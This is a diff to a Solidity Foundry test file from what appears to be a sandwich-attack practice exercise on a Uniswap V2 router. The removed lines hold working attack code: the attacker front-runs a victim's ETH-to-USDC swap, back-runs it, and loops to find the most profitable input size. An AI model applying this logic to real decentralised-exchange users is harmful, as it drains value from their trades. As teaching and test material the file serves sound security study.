@@ -49,35 +49,12 @@ contract SandwichPracticeTest is SandwichSetUp {
     }
 
     // Do not modify this test function
-    // function test_sandwich_attack_with_profit() public attackerModifier {
-    //     // victim swap 1 ETH to USDC with usdcAmountOutMin
-    //     vm.startPrank(victim);
-    //     address[] memory path = new address[](2);
-    //     path[0] = address(weth);
-    //     path[1] = address(usdc);
-
-    //     // # Discussion 1: how to get victim tx detail info ?
-    //     // without attacker action, original usdc amount out is 98715803, use 5% slippage
-    //     // originalUsdcAmountOutMin = 93780012;
-    //     uint256 originalUsdcAmountOut = 98715803;
-    //     uint256 originalUsdcAmountOutMin = (originalUsdcAmountOut * 95) / 100;
-
-    //     uniswapV2Router.swapExactETHForTokens{value: 1 ether}(originalUsdcAmountOutMin, path, victim, block.timestamp);
-    //     vm.stopPrank();
-
-    //     // check victim usdc balance >= originalUsdcAmountOutMin (93780012)
-    //     assertGe(usdc.balanceOf(victim), originalUsdcAmountOutMin);
-    // }
-
-    function test(uint256 i) internal returns (uint256) {
-        vm.startPrank(attacker);
-        address[] memory path1 = new address[](2);
-        path1[0] = address(weth);
-        path1[1] = address(usdc);
-        uniswapV2Router.swapExactETHForTokens{value: i}(0, path1, attacker, block.timestamp);
-        vm.stopPrank();
-
+    function test_sandwich_attack_with_profit() public attackerModifier {
+        // victim swap 1 ETH to USDC with usdcAmountOutMin
         vm.startPrank(victim);
+        address[] memory path = new address[](2);
+        path[0] = address(weth);
+        path[1] = address(usdc);
 
         // # Discussion 1: how to get victim tx detail info ?
         // without attacker action, original usdc amount out is 98715803, use 5% slippage
@@ -85,36 +62,11 @@ contract SandwichPracticeTest is SandwichSetUp {
         uint256 originalUsdcAmountOut = 98715803;
         uint256 originalUsdcAmountOutMin = (originalUsdcAmountOut * 95) / 100;
 
-        uniswapV2Router.swapExactETHForTokens{value: 1 ether}(originalUsdcAmountOutMin, path1, victim, block.timestamp);
+        uniswapV2Router.swapExactETHForTokens{value: 1 ether}(originalUsdcAmountOutMin, path, victim, block.timestamp);
         vm.stopPrank();
 
-        vm.startPrank(attacker);
-        usdc.approve(address(uniswapV2Router), usdc.balanceOf(attacker));
-        address[] memory path2 = new address[](2);
-        path2[0] = address(usdc);
-        path2[1] = address(weth);
-        uniswapV2Router.swapExactTokensForETH(usdc.balanceOf(attacker), 0, path2, attacker, block.timestamp);
-        vm.stopPrank();
-
-        return attacker.balance - attackerInitialEthBalance;
-    }
-
-    error CustomErrorName(uint256 maxProfit);
-
-    function test_max_profit() public {
-        uint256 currentProfit = 0;
-        uint256 maxProfit = 0;
-        uint256 i = 2 ether;
-        do {
-            i -= 1000 wei;
-            currentProfit = test(i);
-            if (currentProfit >= maxProfit) {
-                maxProfit = currentProfit;
-            } else {
-                console.log("max profit: %s", maxProfit);
-                revert CustomErrorName(maxProfit);
-            }
-        } while (true);
+        // check victim usdc balance >= originalUsdcAmountOutMin (93780012)
+        assertGe(usdc.balanceOf(victim), originalUsdcAmountOutMin);
     }
 
     // # Practice 1: attacker sandwich attack
